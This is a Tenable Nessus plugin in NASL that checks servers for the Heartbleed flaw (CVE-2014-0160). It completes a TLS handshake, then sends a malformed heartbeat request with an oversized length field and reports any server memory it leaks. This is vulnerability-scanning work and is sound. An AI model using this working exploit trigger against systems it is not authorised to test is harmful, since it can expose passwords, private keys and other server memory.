#TRUSTED 5d7ff8b59ba9260509444b2831f3ec2b744946068c145f898c635baf39cb34d820d0709ad99357d00178bfc5e3898e4fdd4e37bcefc3ebbd12d0745ce389eeded6af17e6afea201615c719422570776719e27ed223e01fbdeb3d1ee257b3bf7b5ce16dffed395b22cbbcf0d39a9669aff8bb86a3e8bc91c9f91ab96a88c9b70cb5bb4004c75e7c3060fc19e0867ff8e349745421a0ee4c6b78ee919e12358be863d1d5f0ab5b3fb476988c6ebea8b9592537dac0280a68f5aa23f906319609a3306229894e9bded94e640875133e1da2907e970a5d6c932e275a6ec6ca263d44b7f5206d5e0e2a85c73f9c80d4f46e5ca4fb64fc6330687aaee8afc6bc26a6d1af526600ec70cde457a01c5be90f69f7332e73fe7966cf79a202d5b910c2ab88982a954a77d17252e5c43d0147a97e013277312c8d526b55bf80325a1537371933b0b61aef47e6ad9b7c6275c8694b5dbc46fb8d19e785ae8747bc6fdabf99603f8c4e718a5fde144a42dbc3cee3296ebbbd60a3b2ab266b1e65619fe73304b50e7235ae4bf0b598cfc84e785dd325eb359a4bd55bd37f194bbb154220667d96b26a94e856229c0889c7d0eb94787af3f32967b546816deee539f061b331ed22275d97c18a5a5126164cf22ed59f831434d404f47d26e030baab68b7987299556cfc60c4a54e4fe17c918077c72f182ac78998bae29bcb5e05cc2eea5c10486f
#TRUST-RSA-SHA256 6e61dbe6d3e64b658289579b86892ba35960f5535c5c3de1759e56ea1473ff88caedce21d120b8f4ec6f7453831745ca075471fb99fdd69acef63c71db5044c3e1d608d77249e075e8817605e667047f16f3426d0e260111cd12f45dd42dcec107455e797494bc0e9afeb0bad2e6751b2729bfb350dd4daad7ba86a8a745ee49fb3c6f78d9f731cdb5906e3447fffb05249ffc7d517fafe6710ab7bde617ebb3d8868bc04395b3c1bb49955f4dce0f8c4622820aa16e1a71caec02148327c8e0936ef34658cafea2994a10ddc7d6940189452bc6e9496769252e8f92e850bf3473f60de143b4c4fd91256e4616ecd3d73cc5d6337a7204a605ddb22c46357a1e562f6a9dd655f1b7fc2c6c96ea8e08186ae4b3d4ace244c6cc372be8a1825994fe71e2285bc42839ba6c2460451359861ff4fe855467ee6cb0707ff02ae6db06a88c3f61f826c973c5754b0f40543c6926aa82916000d73300369cf00831e392e8994080570487cf14935a612034c15f298d357dd6d5585ffd126efc14e653ba2ae651098eec637ad51ad3cd35b9d184bbd02e41a00260b0dd88d62d4e3b8551daddf0443103eb4fae5de3e8fad9b7314b265a83c9e3a9fb0be7008b2a04f131d385671ec11b7ed63a260f435a1cc9bf4397b138b74f51ec1c41486af78436ec99522d2ca8bf302fadc4027c4e360b5adb62460d05b311f19142ac7582d3411e
#
# (C) Tenable Network Security, Inc.
#

include('compat.inc');

if (description)
{
  script_id(73412);
  script_version("2.23");
  script_set_attribute(attribute:"plugin_modification_date", value:"2023/04/25");

  script_cve_id("CVE-2014-0160");
  script_bugtraq_id(66690);
  script_xref(name:"CERT", value:"720951");
  script_xref(name:"EDB-ID", value:"32745");
  script_xref(name:"EDB-ID", value:"32764");
  script_xref(name:"EDB-ID", value:"32791");
  script_xref(name:"EDB-ID", value:"32998");
  script_xref(name:"CISA-KNOWN-EXPLOITED", value:"2022/05/25");

  script_name(english:"OpenSSL Heartbeat Information Disclosure (Heartbleed)");

  script_set_attribute(attribute:"synopsis", value:
"The remote service is affected by an information disclosure
vulnerability.");
  script_set_attribute(attribute:"description", value:
"Based on its response to a TLS request with a specially crafted
heartbeat message (RFC 6520), the remote service appears to be
affected by an out-of-bounds read flaw.

This flaw could allow a remote attacker to read the contents of up to
64KB of server memory, potentially exposing passwords, private keys,
and other sensitive data.");
  script_set_attribute(attribute:"see_also", value:"http://heartbleed.com/");
  script_set_attribute(attribute:"see_also", value:"http://eprint.iacr.org/2014/140");
  script_set_attribute(attribute:"see_also", value:"http://www.openssl.org/news/vulnerabilities.html#2014-0160");
  script_set_attribute(attribute:"see_also", value:"https://www.openssl.org/news/secadv/20140407.txt");
  script_set_attribute(attribute:"solution", value:
"Upgrade to OpenSSL 1.0.1g or later.

Alternatively, recompile OpenSSL with the '-DOPENSSL_NO_HEARTBEATS'
flag to disable the vulnerable functionality.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2014-0160");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'OpenSSL Heartbeat (Heartbleed) Information Leak');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"in_the_news", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/02/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/04/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/04/08");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:openssl:openssl");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2014-2023 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("ssl_supported_versions.nasl");
  script_require_ports(443, "SSL/Supported");

  exit(0);
}

include("byte_func.inc");
include("ftp_func.inc");
include("global_settings.inc");
include("kerberos_func.inc");
include("ldap_func.inc");
include("misc_func.inc");
include("nntp_func.inc");
include("smtp_func.inc");
include("ssl_funcs.inc");
include("telnet2_func.inc");
include("audit.inc");
include("dump.inc");
include("data_protection.inc");
#
# @remark RFC 6520
#

function heartbeat_ext()
{
  local_var mode;

  mode = _FCT_ANON_ARGS[0];
  if(isnull(mode))
    mode = 1; #  peer allowed to send requests

  return    mkword(15)  +  # extension type
            mkword(1)   +  # extension length
            mkbyte(mode);  # hearbeat mode
}

function heartbeat_req(payload, plen, pad)
{
  local_var req;

  if(isnull(plen))
    plen = strlen(payload);


  req = mkbyte(1) +       # HeartbeatMessageType: request
        mkword(plen) +    # payload length
        payload +         # payload
        pad;              # random padding

  return req;

}


if ( get_kb_item("SSL/Supported") )
{
 port = get_ssl_ports(fork:TRUE);
 if (isnull(port))
   exit(1, "The host does not appear to have any SSL-based services.");

 # Check for TLS; extensions only available in TLSv1 and later
 ssl3 = tls10 = tls11 = tls12 = 0;

 list = get_kb_list('SSL/Transport/'+port);
 if(! isnull(list))
 {
  list = make_list(list);
  foreach encap (list)
  {
    if      (encap == ENCAPS_SSLv3)         ssl3 = 1;
    else if (encap == ENCAPS_TLSv1)         tls10 = 1;
    else if (encap == COMPAT_ENCAPS_TLSv11) tls11 = 1;
    else if (encap == COMPAT_ENCAPS_TLSv12) tls12 = 1;
  }
 }

 if(! (ssl3 || tls10 || tls11 || tls12))
   exit(0, 'The SSL-based service listening on port '+port+' does not appear to support SSLv3 or above.');

 if (tls12)       version = TLS_12;
 else if (tls11)  version = TLS_11;
 else if (tls10)  version = TLS_10;
 else if (ssl3)   version = SSL_V3;
}
else
{
 if ( ! get_port_state(443) ) exit(1, "No SSL port discovered and port 443 is closed");
 port = 443;
 version = TLS_10;
}


# Open port
soc = open_sock_ssl(port);
if ( ! soc ) exit(1, "Failed to open an SSL socket on port "+port+".");

ver  = mkword(version);
exts = heartbeat_ext() + tls_ext_ec() + tls_ext_ec_pt_fmt();

cipherspec = NULL;
foreach cipher (sort(keys(ciphers)))
{
  if(strlen(ciphers[cipher]) == 2)
  {
    cipherspec +=  ciphers[cipher];
  }
}
cspeclen = mkword(strlen(cipherspec));

# length of all extensions
exts_len  = mkword(strlen(exts));
chello = client_hello(v2hello:FALSE, version:ver,
                      extensions:exts,extensionslen:exts_len,
                      cipherspec : cipherspec,
                      cspeclen   : cspeclen
                      );

send(socket:soc, data: chello);

# Read one record at a time. Expect to see at a minimum:
# ServerHello, Certificate, and ServerHelloDone.
hello_done = FALSE;
while (!hello_done)
{
  # Receive a record from the server.
  data = recv_ssl(socket:soc, timeout: 30);
  if (isnull(data))
  {
    close(soc);
    audit(AUDIT_RESP_NOT, port, 'an SSL ClientHello message');
  }

  # ServerHello: Extract the random data for computation of keys.
  rec = ssl_find(
    blob:data,
    'content_type', SSL3_CONTENT_TYPE_HANDSHAKE,
    'handshake_type', SSL3_HANDSHAKE_TYPE_SERVER_HELLO
  );

  if (!isnull(rec))
  {
    # Look for heartbeat mode in ServerHello
    heartbeat_mode = rec['extension_heartbeat_mode'];

    # Make sure we use an SSL version supported by the server
    if(rec['version'] != version && rec['version'] >= 0x0300 && rec['version'] <= 0x0303)
      version = rec['version'];
  }

  # Server Hello Done.
  rec = ssl_find(
    blob:data,
    'content_type', SSL3_CONTENT_TYPE_HANDSHAKE,
    'handshake_type', SSL3_HANDSHAKE_TYPE_SERVER_HELLO_DONE
  );

  if (!isnull(rec))
  {
    hello_done = TRUE;
    break;
  }
}
if(! hello_done)
  exit(1, 'ServerHelloDone not received from server listening on port ' + port+'.');

# Check if TLS server supports heartbeat extension
if(version != SSL_V3 && isnull(heartbeat_mode))
  exit(0, 'The SSL service listening on port ' + port + ' does not appear to support heartbeat extension.');

# Check if TLS server willing to accept heartbeat requests
if(version != SSL_V3 && heartbeat_mode != 1)
  exit(0, 'The SSL service listening on port ' + port + ' does not appear to accept heartbeat requests.');

# Send a malformed heartbeat request
payload = crap(data:'A', length:16);
pad = crap(data:'P',length:16);
hb_req = heartbeat_req(payload: payload, plen:strlen(payload)+ strlen(pad)+0x4000, pad:pad);
if ( version == SSL_V3 )
 rec = ssl_mk_record(type:24, data:hb_req, version:version);
else
 rec = tls_mk_record(type:24, data:hb_req, version:version);
send(socket:soc, data:rec);
res = recv_ssl(socket:soc, partial:TRUE, timeout:30);
close(soc);

# Patched TLS server does not respond
if(isnull(res))
 audit(AUDIT_LISTEN_NOT_VULN, 'SSL service', port);

if ( strlen(res) < 8 )
 exit(1, 'The service listening on port '+ port + ' returned a short SSL record.');

# Got a response
# Look for hearbeat response
msg = ord(res[5]);
if(msg != 2)
 exit(1, 'The service listening on port '+ port + ' did not return a heartbeat response.');

# TLS server overread past payload into the padding field
if((payload + pad) >< res)
{
  hb_res = substr(res, 8);
  hb_res -= (payload + pad);
  if(strlen(hb_res) > 0x1000)
    hb_res = substr(hb_res, 0, 0x1000 -1);

  report = 'Nessus was able to read the following memory from the remote service:\n\n' + data_protection::sanitize_user_full_redaction(output:hexdump(ddata:hb_res));
  security_warning(port:port, extra: report);
}
# Alert
else if(ord(res[0]) == 0x15)
{
 exit(0, 'The service listening on port '+ port + ' returned an alert, which suggests the remote TLS service is not affected.');
}
# Unknown response
else audit(AUDIT_RESP_BAD, port);
